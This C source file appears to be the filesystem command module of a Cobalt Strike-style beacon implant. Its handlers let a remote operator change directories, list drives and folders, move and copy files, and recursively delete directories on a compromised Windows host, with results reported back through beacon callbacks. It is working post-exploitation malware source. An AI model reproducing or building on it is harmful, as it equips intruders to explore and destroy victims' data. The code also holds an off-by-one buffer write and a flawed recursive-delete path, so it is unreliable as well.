#include "pch.h"

#include "filesystem.h"

#include "beacon.h"

void FilesystemCd(char* buffer, int length)
{
	char path[1024];

	if (length > sizeof(path))
		return;

	strncpy(path, buffer, length);
	path[length] = '\0';

	SetCurrentDirectoryA(path);
}

void FilesystemPwd()
{
	char data[2048];
	int length = GetCurrentDirectoryA(sizeof(data), data);
	if (length == 0)
		return;
	BeaconOutput(CALLBACK_PWD, data, length);
}

void FilesystemMkdir(char* buffer, int length)
{
	datap parser;
	BeaconDataParse(&parser, buffer, length);
	char* path = BeaconDataStringPointerCopy(&parser, 0x4000);

	// Create the directory
	CreateDirectoryA(path, NULL);

	free(path);
}

void FilesystemMove(char* buffer, int length)
{
#define MAX_SRC 0x2000
#define MAX_DST 0x2000
	datap* locals = BeaconDataAlloc(MAX_SRC + MAX_DST);
	char* src = BeaconDataPtr(locals, MAX_SRC);
	char* dst = BeaconDataPtr(locals, MAX_DST);

	datap parser;
	BeaconDataParse(&parser, buffer, length);
	BeaconDataStringCopySafe(&parser, src, MAX_SRC);
	BeaconDataStringCopySafe(&parser, dst, MAX_DST);

	// Move the file
	if(!MoveFileA(src, dst))
	{
		DWORD lastError = GetLastError();
		LERROR("Move failed: %s", LAST_ERROR_STR(lastError));
		BeaconErrorD(ERROR_MOVE_FAILED, lastError);
	}

	BeaconDataFree(locals);
}

void FilesystemCopy(char* buffer, int length)
{
#define MAX_EXISTING_FILENAME 0x2000
#define MAX_NEW_FILENAME 0x2000
	datap* locals = BeaconDataAlloc(MAX_EXISTING_FILENAME + MAX_NEW_FILENAME);
	char* existingFileName = BeaconDataPtr(locals, MAX_EXISTING_FILENAME);
	char* newFileName = BeaconDataPtr(locals, MAX_NEW_FILENAME);

	datap parser;
	BeaconDataParse(&parser, buffer, length);
	BeaconDataStringCopySafe(&parser, existingFileName, MAX_EXISTING_FILENAME);
	BeaconDataStringCopySafe(&parser, newFileName, MAX_NEW_FILENAME);

	// Copy the file
	if (!CopyFileA(existingFileName, newFileName, FALSE))
	{
		DWORD lastError = GetLastError();
		LERROR("Copy failed: %s", LAST_ERROR_STR(lastError));
		BeaconErrorD(ERROR_COPY_FAILED, lastError);
	}

	BeaconDataFree(locals);
}

void FilesystemDrives(char* buffer, int length)
{
	datap parser;
	BeaconDataParse(&parser, buffer, length);

	formatp locals;
	BeaconFormatAlloc(&locals, 128);

	int value = BeaconDataInt(&parser);
	BeaconFormatInt(&locals, value);

	int logicalDrives = GetLogicalDrives();
	BeaconFormatPrintf(&locals, "%u", logicalDrives);

	int size = BeaconFormatLength(&locals);
	char* data = BeaconFormatOriginal(&locals);
	BeaconOutput(CALLBACK_PENDING, data, size);

	BeaconFormatFree(&locals);
}

void FilesystemList(char* buffer, int length)
{
#define MAX_FILENAME 0x4000
	char* filename = malloc(MAX_FILENAME);
	*filename = { 0 };

	datap parser;
	BeaconDataParse(&parser, buffer, length);
	int reqno = BeaconDataInt(&parser);
	BeaconDataStringCopySafe(&parser, filename, MAX_FILENAME);

	formatp locals;
	BeaconFormatAlloc(&locals, 0x200000);
	BeaconFormatInt(&locals, reqno);

#define SOURCE_DIRECTORY "\\*"
	if(!strncmp(filename, "." SOURCE_DIRECTORY, MAX_FILENAME))
	{
		GetCurrentDirectoryA(MAX_FILENAME, filename);
		strncat_s(filename, MAX_FILENAME, SOURCE_DIRECTORY, STRLEN(SOURCE_DIRECTORY));
	}

	BeaconFormatPrintf(&locals, "%s\n", filename);
	WIN32_FIND_DATAA findData;
	HANDLE firstFile = FindFirstFileA(filename, &findData);

	if(firstFile == INVALID_HANDLE_VALUE)
	{
		int lastError = GetLastError();
		LERROR("Could not open %s: %s", filename, LAST_ERROR_STR(lastError));
		BeaconErrorDS(ERROR_LIST_OPEN_FAILED, lastError, filename);

		int size = BeaconFormatLength(&locals);
		char* data = BeaconFormatOriginal(&locals);
		BeaconOutput(CALLBACK_PENDING, data, size);
		goto cleanup;
	}

	SYSTEMTIME systemTime, localTime;
	do
	{
		FileTimeToSystemTime(&findData.ftLastWriteTime, &systemTime);
		SystemTimeToTzSpecificLocalTime(NULL, &systemTime, &localTime);

		if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			BeaconFormatPrintf(&locals, "D\t0\t%02d/%02d/%02d %02d:%02d:%02d\t%s\n",
				localTime.wMonth, localTime.wDay, localTime.wYear,
				localTime.wHour, localTime.wMinute, localTime.wSecond,
				findData.cFileName);
		}
		else
		{
			BeaconFormatPrintf(&locals, "F\t%I64d\t%02d/%02d/%02d %02d:%02d:%02d\t%s\n",
				((ULONGLONG)findData.nFileSizeHigh << 32) | findData.nFileSizeLow,
				localTime.wMonth, localTime.wDay, localTime.wYear,
				localTime.wHour, localTime.wMinute, localTime.wSecond,
				findData.cFileName);
		}
	} while (FindNextFileA(firstFile, &findData));

	FindClose(firstFile);

	int size = BeaconFormatLength(&locals);
	char* data = BeaconFormatOriginal(&locals);
	BeaconOutput(CALLBACK_PENDING, data, size);

	cleanup:
	free(filename);
	BeaconFormatFree(&locals);
}

BOOL FilesystemIsDirectory(char* filename)
{
	return GetFileAttributesA(filename) & FILE_ATTRIBUTE_DIRECTORY;
}

void FilesystemRemoveRecursiveCallback(const char* a1, const char* a2, BOOL isDirectory)
{
	char* lpPathName = (char*)malloc(0x4000);
	_snprintf(lpPathName, 0x4000, "%s\\%s", a1, a2);
	if (isDirectory)
		RemoveDirectoryA(lpPathName);
	else
		DeleteFileA(lpPathName);
	free(lpPathName);
}

void FilesystemFindAndProcess(char* filename, WIN32_FIND_DATAA* findData)
{
#define MAX_FILENAME 0x8000
	char* lpFileName;

	lpFileName = malloc(MAX_FILENAME);
	snprintf(lpFileName, MAX_FILENAME, "%s\\*", filename);
	LPWIN32_FIND_DATAA lpCurrentFindFileData = findData;
	HANDLE hFindFile = FindFirstFileA(lpFileName, lpCurrentFindFileData);
	free(lpFileName);

	if (hFindFile == INVALID_HANDLE_VALUE)
		return;

	do
	{
		if(lpCurrentFindFileData->dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			if (strcmp(lpCurrentFindFileData->cFileName, ".") && strcmp(lpCurrentFindFileData->cFileName, ".."))
			{
				char* lpFileNameInternal = malloc(MAX_FILENAME);
				snprintf(lpFileNameInternal, MAX_FILENAME, "%s", lpCurrentFindFileData->cFileName);

				lpFileName = malloc(MAX_FILENAME);
				snprintf(lpFileName, MAX_FILENAME, "%s\\%s", filename, findData->cFileName);
				FilesystemFindAndProcess(lpFileName, findData);
				free(lpFileName);

				FilesystemRemoveRecursiveCallback(filename, lpFileNameInternal, TRUE);
				free(lpFileNameInternal);
			}

			lpCurrentFindFileData = findData;
		}
		else
		{
			FilesystemRemoveRecursiveCallback(filename, lpCurrentFindFileData->cFileName, FALSE);
		}
	} while (FindNextFileA(hFindFile, lpCurrentFindFileData));
	FindClose(hFindFile);
}

void FilesystemRemoveDirectoryChildren(char* filepath)
{
	WIN32_FIND_DATAA findData;

	FilesystemFindAndProcess(
		filepath,
		&findData);
}

void FilesystemRemove(char* buffer, int length)
{
	datap parser;
	BeaconDataParse(&parser, buffer, length);
	char* filepath = BeaconDataStringPointerCopy(&parser, 0x4000);
	if (FilesystemIsDirectory(filepath))
	{
		FilesystemRemoveDirectoryChildren(filepath);
		RemoveDirectoryA(filepath);
	}
	else
	{
		DeleteFileA(filepath);
	}
	free(filepath);
}